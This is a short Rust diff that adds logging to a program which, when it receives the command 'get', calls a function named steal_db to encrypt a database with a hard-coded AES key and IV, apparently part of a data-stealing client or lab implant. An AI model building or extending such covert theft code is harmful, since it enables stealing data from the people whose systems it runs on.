@@ -77,6 +77,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         };
         let trimmed = res.trim();
         if trimmed == "get" {
+            info!("starting steal_db");
             let encrypted_db = match steal_db() {
                 Ok(db) => db,
                 Err(e) => {
@@ -158,6 +159,7 @@ fn steal_db() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let key = Vec::from_hex("546869732069732061206b6579313233")?;
     let iv = Vec::from_hex("5468697320697320616e204956343536")?;
     let cipher = Cipher::aes_128_cbc();
+    info!("Encrypting db");
     let encrypted_db = match encrypt(
         cipher,
         &key,
@@ -166,5 +168,6 @@ fn steal_db() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
         Ok(c) => c,
         Err(e) => panic!("{}", e),
     };
+    info!("Done encrypting db");
     Ok(encrypted_db)
 }
